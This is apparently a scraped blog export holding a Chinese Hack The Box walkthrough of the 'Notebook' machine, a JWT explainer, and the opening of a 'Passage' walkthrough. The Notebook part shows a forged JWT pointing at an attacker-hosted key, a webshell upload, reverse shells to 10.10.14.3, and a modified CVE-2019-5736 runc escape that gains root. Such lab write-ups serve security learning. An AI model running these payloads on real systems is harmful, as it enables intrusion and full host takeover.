c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-title: The Notebook - Your Note Keeper10010/tcp filtered rxapiService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 70.43 seconds Web页面为thenotebook的登录界面，尝试弱密码无果。然后发现有一个注册页面，注册了user:test1/pass:test1账户。注意到cookie中auth字段似乎是JWT TOKEN，具体可以参考上一篇blog。","text":"0x00 信息收集使用nmap扫描，发现80端口开放，暂且先不管10010端口 12345678910111213141516171819┌──(root💀kali)-[/home/fnut/notebook]└─# nmap -sC -sV -oA notebook 10.129.120.189Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-27 22:26 EDTNmap scan report for 10.129.120.189Host is up (0.22s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)| 256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)|_ 256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-title: The Notebook - Your Note Keeper10010/tcp filtered rxapiService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 70.43 seconds Web页面为thenotebook的登录界面，尝试弱密码无果。然后发现有一个注册页面，注册了user:test1/pass:test1账户。注意到cookie中auth字段似乎是JWT TOKEN，具体可以参考上一篇blog。 1auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6InRlc3QxIiwiZW1haWwiOiJ0ZXN0MUB0ZXN0MS5jb20iLCJhZG1pbl9jYXAiOjB9.maMvB6Phv0rQdtZArJy0G1pAjHdueVUgvpIRmV6JC7oVB5OlTSBhr8YjfJhtGfVWQseBf97qwOpWcwe0C99eN3sYeOh2U5388nahK39Q2Il7q7JlA52-n7Nf_Dh-ABQMqUaplbZulTt3pJeAlguLBqm9zq0PM0EEg9DXqAcfhTiUvgmDFhJCZU45CDD3sePoWddhpVlzS2Qjmu7WiEOrhdJjFIUFxAJq0EX2IXTtFaMSbjWGF-vyRt2t7s0dIN4v_EsSNXjEOJ8BWvkPw5cymz8TCLLpmsZrmTKaBqF2E30u0-B7sV4-LP6x3mabqdLt_raKTvF_c7gKM6wxSeh05Byu3s5xP3NBd6wB9k8xotIy5xwUFb7vz1-71Mx2yIKz2DStmZ_rzCdR41IwomIGqDF1RQbiT-P6naZRojvneuegffv-Rh5UuBND71PUv6k-GjtB5TcZAvUQkCTG29aizfVas8yXeqPlNge-ddZzlUgG_UBI0tLQp3u6VsiXm1itRsBNf8otCXuIMtTPin3H5Fqru0rtMduGXgNInoE1OFryo_YB-_df3BJVJMTvCo_nJaifwBAJiOV-SnvIHOCKwdyMS5j4SwbHDBBxxaGBq8Lxosi3_zJaZnFL2s0SaJFhrHa8YuFCqSc0PdjOm_CQwlxyVDkdXV_m0wspMuw6odw 使用在线JWT网站可以解析：https://jwt.io/ 123456Header:{ \"typ\": \"JWT\", \"alg\": \"RS256\", \"kid\": \"http://localhost:7070/privKey.key\"} 123456Payload:{ \"username\": \"test1\", \"email\": \"test1@test1.com\", \"admin_cap\": 0} 可以看到有一个admin_cap字段，于是我们尝试修改这个字段，来拥有管理员权限。 0x01 获得foothold修改jwt_token可以使用github上的工具：https://github.com/ticarpi/jwt_tool，因为token中包含了私钥的链接，我们也将其替换为jwt_tool中的RSA私钥链接来对token进行签名，并将admin_cap字段修改为true。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374┌──(root💀kali)-[/home/fnut/notebook/jwt_tool]└─# python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6InRlc3QxIiwiZW1haWwiOiJ0ZXN0MUB0ZXN0MS5jb20iLCJhZG1pbl9jYXAiOjB9.maMvB6Phv0rQdtZArJy0G1pAjHdueVUgvpIRmV6JC7oVB5OlTSBhr8YjfJhtGfVWQseBf97qwOpWcwe0C99eN3sYeOh2U5388nahK39Q2Il7q7JlA52-n7Nf_Dh-ABQMqUaplbZulTt3pJeAlguLBqm9zq0PM0EEg9DXqAcfhTiUvgmDFhJCZU45CDD3sePoWddhpVlzS2Qjmu7WiEOrhdJjFIUFxAJq0EX2IXTtFaMSbjWGF-vyRt2t7s0dIN4v_EsSNXjEOJ8BWvkPw5cymz8TCLLpmsZrmTKaBqF2E30u0-B7sV4-LP6x3mabqdLt_raKTvF_c7gKM6wxSeh05Byu3s5xP3NBd6wB9k8xotIy5xwUFb7vz1-71Mx2yIKz2DStmZ_rzCdR41IwomIGqDF1RQbiT-P6naZRojvneuegffv-Rh5UuBND71PUv6k-GjtB5TcZAvUQkCTG29aizfVas8yXeqPlNge-ddZzlUgG_UBI0tLQp3u6VsiXm1itRsBNf8otCXuIMtTPin3H5Fqru0rtMduGXgNInoE1OFryo_YB-_df3BJVJMTvCo_nJaifwBAJiOV-SnvIHOCKwdyMS5j4SwbHDBBxxaGBq8Lxosi3_zJaZnFL2s0SaJFhrHa8YuFCqSc0PdjOm_CQwlxyVDkdXV_m0wspMuw6odw -T -S rs256 \\ \\ \\ \\ \\ \\ \\__ | | \\ |\\__ __| \\__ __| | | | \\ | | | \\ \\ | | \\ | | | __ \\ __ \\ | \\ | _ | | | | | | | | | | / \\ | | | | | | | |\\ | / \\ | | |\\ |\\ | | \\______/ \\__/ \\__| \\__| \\__| \\______/ \\______/ \\__| Version 2.2.3 \\______| @ticarpi Original JWT: ==================================================================== This option allows you to tamper with the header, contents and signature of the JWT. ==================================================================== Token header values: [1] typ = \"JWT\"[2] alg = \"RS256\"[3] kid = \"http://localhost:7070/privKey.key\"[4] *ADD A VALUE*[5] *DELETE A VALUE*[0] Continue to next stepPlease select a field number: (or 0 to Continue) > 3Current value of kid is: http://localhost:7070/privKey.key Please enter new value and hit ENTER> http://10.10.14.3/jwttool_custom_private_RSA.pem[1] typ = \"JWT\"[2] alg = \"RS256\"[3] kid = \"http://10.10.14.3:8000/jwttool_custom_private_RSA.pem\"[4] *ADD A VALUE*[5] *DELETE A VALUE*[0] Continue to next stepPlease select a field number:(or 0 to Continue)> 0Token payload values:[1] username = \"test1\"[2] email = \"test1@test1.com\"[3] admin_cap = 0[4] *ADD A VALUE*[5] *DELETE A VALUE*[0] Continue to next stepPlease select a field number:(or 0 to Continue)> 3Current value of admin_cap is: 0Please enter new value and hit ENTER> 1[1] username = \"test1\"[2] email = \"test1@test1.com\"[3] admin_cap = 1[4] *ADD A VALUE*[5] *DELETE A VALUE*[0] Continue to next stepPlease select a field number:(or 0 to Continue)> 0jwttool_74b2ffe4a2b6b3bdec130b9fb81c5b30 - Tampered token - RSA Signing:[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6InRlc3QxIiwiZW1haWwiOiJ0ZXN0MUB0ZXN0MS5jb20iLCJhZG1pbl9jYXAiOmZhbHNlfQ.LwZ1sFISmGljpZTRye7QLVc27tFGI76dCMjJopmvgOJ9NnIvK7qJg2F_KDcBIVv0Ua662pjgiSFUejFVekabRhTU-0k-BrzntmQQVtPDgr9YsDtgKczper0TGXGl6NCYOjjS4tidLAt8dvQZvJ-Sm1vWv_qLL3XxLiorYA-gjiKPt1d4exwWHoBnPnUI_TqXntmPWh75alvAAE_qyzQsPRmpBUuvIHBquEJ8L43inFnQi3M8HuBbOeLrvZeKn9ig9C8ngrZQ0ItbZcwuhnT5fVotnfcSaJwe309DQagWW-Y_Zq4g0Fzo-33iwMrnGY60a16czYmVX_TdbObSZq1lB0MJhG-lqi3XP_TGdXNMJOV6L_AIiFPE5RW9O7dEnIzvLUATPL9LA3EBfi9pSbstqY7zYIDybKOMm2U0WHkExz2Pua0AEUzxH_pa_3wd_vw7SF6JZMRwD4phBLo8Dut2bK5xhbSwaAUwmHp8Z5ouKpv4-W7RIqIdSPPDENELA7cbJ8yVmdr2s3LF9X-KsB7gPtwPyMCJqbhHJwJX0HmOGDRuiouMO0EPnbwclmpj7IunT9Bbj4F9-nxdpGta4m1X59qaJUnqlusW5-ejrFfenBirX9Vc28rTs5_WXcrHG6vmVTY5YOopw1Am_sR9lEekX7hZDKbPpKIETkd6DMnMFpk 可以直接使用cookie editor插件将test1用户的cookie替换为新的token，刷新页面，可以看到页面上多了一个admin_panel页面。这个页面可以允许我们上传文件：http://10.129.136.157/admin/upload，我们自然可以上传一个webshell来完成后续渗透。 1234567891011121314151617181920212223242526┌──(root💀kali)-[/home/fnut/notebook/jwt_tool]└─# locate cmd-simple.php 1 ⨯/usr/share/seclists/Web-Shells/FuzzDB/cmd-simple.php ┌──(root💀kali)-[/home/fnut/notebook/jwt_tool]└─# cp /usr/share/seclists/Web-Shells/FuzzDB/cmd-simple.php ./exp.php ┌──(root💀kali)-[/home/fnut/notebook/jwt_tool]└─# cat exp.php Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd 上传并保存后，页面回显了上传后的文件名，直接访问即可以通过上传的webshell执行任意命令。 123http://10.129.136.157/f091d1b9274c881f8e41b2f96e6b9936.phpUsage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd 构造反弹shell获取www-data权限： 1http://10.129.136.157/f091d1b9274c881f8e41b2f96e6b9936.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.3%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 我们主机上监听4444端口即可获得反弹到的shell： 123456┌──(root💀kali)-[/home/fnut/notebook/jwt_tool]└─# nc -nvlp 4444 listening on [any] 4444 ...connect to [10.10.14.3] from (UNKNOWN) [10.129.136.157] 34878/bin/sh: 0: can't access tty; job control turned off$ 0x02 权限提升先将获得的shell进行扩展，方便进行渗透： 1234$ python3 --versionPython 3.6.9$ python3 -c \"import pty;pty.spawn('/bin/bash')\"www-data@thenotebook:~/html$ 查看获得的用户id和/etc/passwd： 1234567891011121314151617181920212223242526272829303132333435www-data@thenotebook:~/html$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@thenotebook:~/html$ cat /etc/passwdcat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinsyslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin_apt:x:104:65534::/nonexistent:/usr/sbin/nologinlxd:x:105:65534::/var/lib/lxd/:/bin/falseuuidd:x:106:110::/run/uuidd:/usr/sbin/nologindnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologinpollinate:x:109:1::/var/cache/pollinate:/bin/falsesshd:x:110:65534::/run/sshd:/usr/sbin/nologinnoah:x:1000:1000:Noah:/home/noah:/bin/bash 可以看到，拥有/bin/bash权限的用户为root和noah，这两个用户即为我们的后续目标。继续查找靶机上的文件，在/var/backups/文件夹下发现了一个压缩文件： 123456789www-data@thenotebook:/var/backups$ ls -lals -latotal 60drwxr-xr-x 2 root root 4096 Apr 26 14:18 .drwxr-xr-x 14 root root 4096 Feb 12 06:52 ..-rw-r--r-- 1 root root 33252 Feb 24 08:53 apt.extended_states.0-rw-r--r-- 1 root root 3609 Feb 23 08:58 apt.extended_states.1.gz-rw-r--r-- 1 root root 3621 Feb 12 06:52 apt.extended_states.2.gz-rw-r--r-- 1 root root 4373 Feb 17 09:02 home.tar.gz 将文件通过httpserver传到本地： 1234567891011┌──(root💀kali)-[/home/fnut/notebook]└─# wget http://10.129.136.157:8000/home.tar.gz--2021-04-26 11:17:10-- http://10.129.136.157:8000/home.tar.gzConnecting to 10.129.136.157:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 4373 (4.3K) [application/gzip]Saving to: ‘home.tar.gz’home.tar.gz 100%[==================================================================================================================================>] 4.27K --.-KB/s in 0s 2021-04-26 11:17:10 (135 MB/s) - ‘home.tar.gz’ saved [4373/4373] 本地解压之后发现这个压缩文件为noah用户home文件夹的备份： 123456789101112131415┌──(root💀kali)-[/home/fnut/notebook]└─# tar -xzvf home.tar.gz home/home/noah/home/noah/.bash_logouthome/noah/.cache/home/noah/.cache/motd.legal-displayedhome/noah/.gnupg/home/noah/.gnupg/private-keys-v1.d/home/noah/.bashrchome/noah/.profilehome/noah/.ssh/home/noah/.ssh/id_rsahome/noah/.ssh/authorized_keyshome/noah/.ssh/id_rsa.pub 可以直接使用noah用户的私钥文件进行ssh连接： 1234567891011121314151617181920212223242526┌──(root💀kali)-[/home/…/notebook/home/noah/.ssh]└─# ssh -i id_rsa noah@10.129.136.157 127 ⨯The authenticity of host '10.129.136.157 (10.129.136.157)' can't be established.ECDSA key fingerprint is SHA256:GHcgekaLnxmzAeBtBN8jWgd3DME3eniUb0l+PDmejDQ.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.129.136.157' (ECDSA) to the list of known hosts.Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon Apr 26 15:22:46 UTC 2021 System load: 0.0 Processes: 183 Usage of /: 40.0% of 7.81GB Users logged in: 0 Memory usage: 17% IP address for ens160: 10.129.136.157 Swap usage: 0% IP address for docker0: 172.17.0.161 packages can be updated.0 updates are security updates.Last login: Wed Feb 24 09:09:34 2021 from 10.10.14.5noah@thenotebook:~$ 0x03 获得root权限查看noah用户的sudo脚本，可以看到可以以root用户直接执行docker启动webapp-dev01的命令： 1234567noah@thenotebook:/var/backups$ sudo -lMatching Defaults entries for noah on thenotebook: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser noah may run the following commands on thenotebook: (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01* Google了一下docker exec相关的CVE，找到了CVE-2019-5736-PoC： 1https://github.com/Frichetten/CVE-2019-5736-PoC 安装go环境：go下载地址：https://golang.google.cn/dl/ 12rm -rf /usr/local/go && tar -C /usr/local -xzf go1.16.3.linux-amd64.tar.gz export PATH=$PATH:/usr/local/go/bin 修改main.go中的payload，修改为反弹shell，并编译main.go文件： 123var payload = \"#!/bin/bash \\n bash -i >& /dev/tcp/10.10.14.3/4444 0>&1\"go build main.go 在靶机上执行docker命令，进入webapp-dev01容器，并将main文件通过wget传进来。同时我们在新的窗口中监听4444端口： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354noah@thenotebook:/$ sudo docker exec -it webapp-dev01 /bin/bashroot@0f4c2517af40:/opt/webapp# ls -latotal 52drwxr-xr-x 1 root root 4096 Feb 12 07:30 .drwxr-xr-x 1 root root 4096 Feb 12 07:30 ..drwxr-xr-x 1 root root 4096 Feb 12 07:30 __pycache__drwxr-xr-x 3 root root 4096 Nov 18 13:27 admin-rw-r--r-- 1 root root 3303 Nov 16 19:43 create_db.py-rw-r--r-- 1 root root 9517 Feb 11 15:00 main.py-rw------- 1 root root 3247 Feb 11 15:09 privKey.key-rw-r--r-- 1 root root 78 Feb 12 07:12 requirements.txtdrwxr-xr-x 3 root root 4096 Nov 19 10:57 staticdrwxr-xr-x 2 root root 4096 Nov 18 13:47 templates-rw-r--r-- 1 root root 20 Nov 20 09:18 webapp.tar.gzroot@0f4c2517af40:/opt/webapp# wget http://10.10.14.3:8000/main--2021-04-26 15:56:05-- http://10.10.14.3:8000/mainConnecting to 10.10.14.3:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 2140175 (2.0M) [application/octet-stream]Saving to: ‘main’main 100%[===========================================>] 2.04M 498KB/s in 4.2s 2021-04-26 15:56:10 (498 KB/s) - ‘main’ saved [2140175/2140175]root@0f4c2517af40:/opt/webapp# ls -latotal 2148drwxr-xr-x 1 root root 4096 Apr 26 15:56 .drwxr-xr-x 1 root root 4096 Feb 12 07:30 ..drwxr-xr-x 1 root root 4096 Feb 12 07:30 __pycache__drwxr-xr-x 3 root root 4096 Nov 18 13:27 admin-rw-r--r-- 1 root root 3303 Nov 16 19:43 create_db.py-rw-r--r-- 1 root root 2140175 Apr 26 15:50 main-rw-r--r-- 1 root root 9517 Feb 11 15:00 main.py-rw------- 1 root root 3247 Feb 11 15:09 privKey.key-rw-r--r-- 1 root root 78 Feb 12 07:12 requirements.txtdrwxr-xr-x 3 root root 4096 Nov 19 10:57 staticdrwxr-xr-x 2 root root 4096 Nov 18 13:47 templates-rw-r--r-- 1 root root 20 Nov 20 09:18 webapp.tar.gzroot@0f4c2517af40:/opt/webapp# mv main /tmproot@0f4c2517af40:/opt/webapp# cd /tmproot@0f4c2517af40:/tmp# ls -latotal 2136drwxrwxrwt 1 root root 4096 Apr 26 15:56 .drwxr-xr-x 1 root root 4096 Feb 24 09:11 ..-rw-r--r-- 1 root root 2140175 Apr 26 15:50 main-rw-r--r-- 1 root root 78 Feb 12 07:12 requirements.txt-rw-r--r-- 1 root root 32768 Feb 12 07:30 webapp.dbroot@0f4c2517af40:/tmp# chmod +x main root@0f4c2517af40:/tmp# ./main [+] Overwritten /bin/sh successfully[+] Found the PID: 1153[+] Successfully got the file handle[+] Successfully got write handle &{0xc0000500c0} 执行后可以看到Overwritten /bin/sh successfully， 即/bin/sh已经被恶意的修改了。与此同时（执行main之后立即）我们在另一个noah用户的shell中执行docker命令，可以看到与正常执行docker命令回显不同： 12noah@thenotebook:~$ sudo docker exec -it webapp-dev01 /bin/shNo help topic for '/bin/sh' 在新的监听窗口中，我们获得了root权限的shell： 1234567891011└─# nc -nvlp 4444listening on [any] 4444 ...connect to [10.10.14.3] from (UNKNOWN) [10.129.136.157] 34900bash: cannot set terminal process group (23972): Inappropriate ioctl for devicebash: no job control in this shell { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://yoursite.com/categories/Hackthebox/"}],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://yoursite.com/tags/Hackthebox/"}]},{"title":"JSON WEB TOKEN","slug":"JSON-WEB-TOKEN","date":"2021-03-28T15:33:08.357Z","updated":"2021-03-28T15:41:31.375Z","comments":true,"path":"2021/03/28/JSON-WEB-TOKEN/","link":"","permalink":"http://yoursite.com/2021/03/28/JSON-WEB-TOKEN/","excerpt":"0x00 什么是JWT Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。 0x01 起源说起JWT，我们应该来谈一谈基于token的认证和传统的session认证的区别。 传统的session认证我们知道，http协议本身是一种无状态的协议，而这就意味着如果用户向我们的应用提供了用户名和密码来进行用户认证，那么下一次请求时，用户还要再一次进行用户认证才行，因为根据http协议，我们并不能知道是哪个用户发出的请求，所以为了让我们的应用能识别是哪个用户发出的请求，我们只能在服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为cookie,以便下次请求时发送给我们的应用，这样我们的应用就能识别请求来自哪个用户了,这就是传统的基于session认证。 但是这种基于session的认证使应用本身很难得到扩展，随着不同客户端用户的增加，独立的服务器已无法承载更多的用户，而这时候基于session认证应用的问题就会暴露出来。","text":"0x00 什么是JWT Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。 0x01 起源说起JWT，我们应该来谈一谈基于token的认证和传统的session认证的区别。 传统的session认证我们知道，http协议本身是一种无状态的协议，而这就意味着如果用户向我们的应用提供了用户名和密码来进行用户认证，那么下一次请求时，用户还要再一次进行用户认证才行，因为根据http协议，我们并不能知道是哪个用户发出的请求，所以为了让我们的应用能识别是哪个用户发出的请求，我们只能在服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为cookie,以便下次请求时发送给我们的应用，这样我们的应用就能识别请求来自哪个用户了,这就是传统的基于session认证。 但是这种基于session的认证使应用本身很难得到扩展，随着不同客户端用户的增加，独立的服务器已无法承载更多的用户，而这时候基于session认证应用的问题就会暴露出来。 基于session认证所显露的问题Session: 每个用户经过我们的应用认证之后，我们的应用都要在服务端做一次记录，以方便用户下次请求的鉴别，通常而言session都是保存在内存中，而随着认证用户的增多，服务端的开销会明显增大。 扩展性: 用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须要请求在这台服务器上,这样才能拿到授权的资源，这样在分布式的应用上，相应的限制了负载均衡器的能力。这也意味着限制了应用的扩展能力。 CSRF: 因为是基于cookie来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。 0x02 基于token的鉴权机制基于token的鉴权机制类似于http协议也是无状态的，它不需要在服务端去保留用户的认证信息或者会话信息。这就意味着基于token认证机制的应用不需要去考虑用户在哪一台服务器登录了，这就为应用的扩展提供了便利。 流程上是这样的： 用户使用用户名密码来请求服务器 服务器进行验证用户的信息 服务器通过验证发送给用户一个token 客户端存储token，并在每次请求时附送上这个token值 服务端验证token值，并返回数据 这个token必须要在每次请求时传递给服务端，它应该保存在请求头里， 另外，服务端要支持CORS(跨来源资源共享)策略，一般我们在服务端这么做就可以了Access-Control-Allow-Origin: *。 那么我们现在回到JWT的主题上。 0x03 JWT长什么样？JWT是由三段信息构成的，将这三段信息文本用.链接一起就构成了Jwt字符串。就像这样: 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ 0x04 JWT的构成第一部分我们称它为头部（header),第二部分我们称其为载荷（payload, 类似于飞机上承载的物品)，第三部分是签证（signature). headerjwt的头部承载两部分信息： 声明类型，这里是jwt 声明加密的算法 通常直接使用 HMAC SHA256 完整的头部就像下面这样的JSON： 1234{ 'typ': 'JWT', 'alg': 'HS256'} 然后将头部进行base64加密（该加密是可以对称解密的),构成了第一部分. 1eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 playload载荷就是存放有效信息的地方。这个名字像是特指飞机上承载的货品，这些有效信息包含三个部分 标准中注册的声明 公共的声明 私有的声明 标准中注册的声明 (建议但不强制使用) ： iss: jwt签发者 sub: jwt所面向的用户 aud: 接收jwt的一方 exp: jwt的过期时间，这个过期时间必须要大于签发时间 nbf: 定义在什么时间之前，该jwt都是不可用的. iat: jwt的签发时间 jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。 公共的声明 ： 公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密. 私有的声明 ： 私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。 定义一个payload: 12345{ \"sub\": \"1234567890\", \"name\": \"John Doe\", \"admin\": true} 然后将其进行base64加密，得到Jwt的第二部分。 1eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9 signaturejwt的第三部分是一个签证信息，这个签证信息由三部分组成： header (base64后的) payload (base64后的) secret 这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分。 1234// javascriptvar encodedString = base64UrlEncode(header) + '.' + base64UrlEncode(payload);var signature = HMACSHA256(encodedString, 'secret'); // TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ 将这三部分用.连接成一个完整的字符串,构成了最终的jwt: 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ 注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。 如何应用一般是在请求头里加入Authorization，并加上Bearer标注： 12345fetch('api/user/1', { headers: { 'Authorization': 'Bearer ' + token }}) 服务端会验证token，如果验证通过就会返回相应的资源。整个流程就是这样的: 0x05 总结优点 因为json的通用性，所以JWT是可以进行跨语言支持的，像JAVA,JavaScript,NodeJS,PHP等很多语言都可以使用。 因为有了payload部分，所以JWT可以在自身存储一些其他业务逻辑所必要的非敏感信息。 便于传输，jwt的构成非常简单，字节占用很小，所以它是非常便于传输的。 它不需要在服务端保存会话信息, 所以它易于应用的扩展 安全相关 不应该在jwt的payload部分存放敏感信息，因为该部分是客户端可解密的部分。 保护好secret私钥，该私钥非常重要。 如果可以，请使用https协议 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"Json","slug":"Json","permalink":"http://yoursite.com/categories/Json/"}],"tags":[{"name":"JWT","slug":"JWT","permalink":"http://yoursite.com/tags/JWT/"}]},{"title":"Hackthebox--Passage","slug":"Hackthebox--Passage","date":"2021-02-26T16:45:02.082Z","updated":"2021-02-26T16:44:25.585Z","comments":true,"path":"2021/02/27/Hackthebox--Passage/","link":"","permalink":"http://yoursite.com/2021/02/27/Hackthebox--Passage/","excerpt":"0x00 信息收集使用nmap进行端口扫描，发现只有以下端口开放： 123456789101112131415161718nmap -sC -sV -oA nmap 10.129.104.160Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-26 10:24 ESTNmap scan report for 10.129.104.160Host is up (0.25s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)| 256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)|_ 256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-title: Passage News10621/tcp filtered unknownService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 258.09 seconds 页面打开为一个新闻界面，查看页面源码","text":"0x00 信息收集使用nmap进行端口扫描，发现只有以下端口开放： 123456789101112131415161718nmap -sC -sV -oA nmap 10.129.104.160Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-26 10:24 ESTNmap scan report for 